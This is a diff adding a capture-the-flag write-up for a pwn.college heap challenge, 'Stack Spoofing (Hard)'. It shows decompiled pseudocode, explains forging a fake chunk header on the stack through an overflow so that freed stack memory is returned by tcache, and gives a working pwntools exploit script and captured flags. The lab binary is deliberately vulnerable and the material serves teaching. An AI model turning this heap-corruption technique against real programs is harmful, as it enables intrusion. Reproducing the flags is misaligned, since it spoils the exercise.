@@ -6158,7 +6158,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
             {
               while ( 1 )
               {
-                print_tcache(main_thread_tcache);
+                print_TCACHE(main_thread_TCACHE);
                 puts(byte_3519);
                 printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): ");
                 __isoc99_scanf("%127s", s1);
@@ -6360,3 +6360,182 @@ pwn.college{07HJidoeBZC_x5Mse2AW6v4D92j.01M5MDL4ITM0EzW}
 ```
 
 &nbsp;
+
+## Stack Spoofing (Hard)
+
+```
+hacker@dynamic-allocator-misuse~stack-spoofing-hard:/$ /challenge/stack-spoofing-hard
+###
+### Welcome to /challenge/stack-spoofing-hard!
+###
+
+
+[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit):
+```
+
+### Binary Analysis
+
+```c title="/challenge/stack-spoofing-hard :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  unsigned int v5; // [rsp+28h] [rbp-1A8h]
+  unsigned int v6; // [rsp+28h] [rbp-1A8h]
+  unsigned int v7; // [rsp+28h] [rbp-1A8h]
+  unsigned int v8; // [rsp+28h] [rbp-1A8h]
+  unsigned int size; // [rsp+2Ch] [rbp-1A4h]
+  void *ptr[16]; // [rsp+40h] [rbp-190h] BYREF
+  char s1[128]; // [rsp+C0h] [rbp-110h] BYREF
+  _BYTE v12[64]; // [rsp+140h] [rbp-90h] BYREF
+  _QWORD v13[10]; // [rsp+180h] [rbp-50h] BYREF
+
+  v13[9] = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            while ( 1 )
+            {
+              while ( 1 )
+              {
+                puts(byte_2124);
+                printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_2124);
+                if ( strcmp(s1, "malloc") )
+                  break;
+                printf("Index: ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_2124);
+                v5 = atoi(s1);
+                if ( v5 > 0xF )
+                  __assert_fail("allocation_index < 16", "<stdin>", 0x5Au, "main");
+                printf("Size: ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_2124);
+                size = atoi(s1);
+                ptr[v5] = malloc(size);
+              }
+              if ( strcmp(s1, "free") )
+                break;
+              printf("Index: ");
+              __isoc99_scanf("%127s", s1);
+              puts(byte_2124);
+              v6 = atoi(s1);
+              if ( v6 > 0xF )
+                __assert_fail("allocation_index < 16", "<stdin>", 0x6Au, "main");
+              free(ptr[v6]);
+            }
+            if ( strcmp(s1, "puts") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_2124);
+            v7 = atoi(s1);
+            if ( v7 > 0xF )
+              __assert_fail("allocation_index < 16", "<stdin>", 0x76u, "main");
+            printf("Data: ");
+            puts((const char *)ptr[v7]);
+          }
+          if ( strcmp(s1, "scanf") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_2124);
+          v8 = atoi(s1);
+          if ( v8 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x82u, "main");
+          v3 = malloc_usable_size(ptr[v8]);
+          sprintf(s1, "%%%us", v3);
+          __isoc99_scanf(s1, ptr[v8]);
+          puts(byte_2124);
+        }
+        if ( strcmp(s1, "stack_free") )
+          break;
+        free(v13);
+      }
+      if ( strcmp(s1, "stack_scanf") )
+        break;
+      __isoc99_scanf("%127s", v12);
+      puts(byte_2124);
+    }
+    if ( strcmp(s1, "stack_malloc_win") )
+      break;
+    if ( malloc(0x75u) == v13 )
+      win();
+  }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+The goal is the same as the easy version: make `malloc(0x75)` return `v13`'s address. The difference is that this binary prints nothing — no address leaks — and `stack_free` aborts immediately with `munmap_chunk(): invalid pointer` because `v13` has no valid chunk header in the memory before it.
+
+### Forging a Chunk Header
+
+For `free` to accept a pointer, the allocator checks the size field stored 8 bytes before the pointer (`ptr - 0x8`). If that value is not a plausible chunk size, the allocator aborts.
+
+`v13` is at `[rbp-0x50]` and `v12` (the `stack_scanf` buffer) is at `[rbp-0x90]`. The offset between them is `0x40` = 64 bytes. Since `stack_scanf` reads up to 127 bytes, we can write past `v12` and into the memory just before `v13`.
+
+The fake size field needs to sit at `v13 - 0x8` = `rbp-0x58`, which is `rbp-0x90 + 0x38` = 56 bytes into the `stack_scanf` buffer. We write 56 bytes of padding followed by a valid size value.
+
+`malloc(0x75)` rounds up to a 128-byte chunk, which corresponds to size `0x81` (128 with the `PREV_INUSE` bit set). Writing `0x81` at `v13 - 0x8` makes the allocator believe `v13` is a valid 128-byte chunk:
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  STACK                                                  ┆
+├─────────────────────────────────────────────────────────┤
+│  rbp-0x90: v12  <- stack_scanf writes here              │
+│            "A" * 56 bytes of padding                    │
+├─────────────────────────────────────────────────────────┤
+│  rbp-0x58: fake size field = 0x81  <- v13 - 0x8         │
+├─────────────────────────────────────────────────────────┤
+│  rbp-0x50: v13  <- stack_free frees here                │
+│            stack_malloc_win checks malloc(0x75) == here │
+└─────────────────────────────────────────────────────────┘
+```
+
+With the fake header in place, `stack_free` succeeds and puts `v13` into the TCACHE bin for 113-128 byte chunks. Then `stack_malloc_win`'s `malloc(0x75)` pops it back out, the check passes, and `win()` is called.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/stack-spoofing-hard")
+p.recvuntil(b"quit): ")
+
+# write fake chunk size field 56 bytes into v12, landing at v13-0x8
+p.sendline(b"stack_scanf")
+p.sendline(b"A" * 56 + p64(0x81))
+p.recvuntil(b"quit): ")
+
+# now stack_free succeeds — v13 is a valid-looking chunk
+p.sendline(b"stack_free")
+p.recvuntil(b"quit): ")
+
+# malloc(0x75) pops v13 from TCACHE, triggering win
+p.sendline(b"stack_malloc_win")
+print(p.recvall(timeout=3).decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~stack-spoofing-hard:/$ python ~/script.py
+You win! Here is your flag:
+pwn.college{UO-knMx2TfsXlZ5xVxHIS2Fcp-x.0FN5MDL4ITM0EzW}
+```
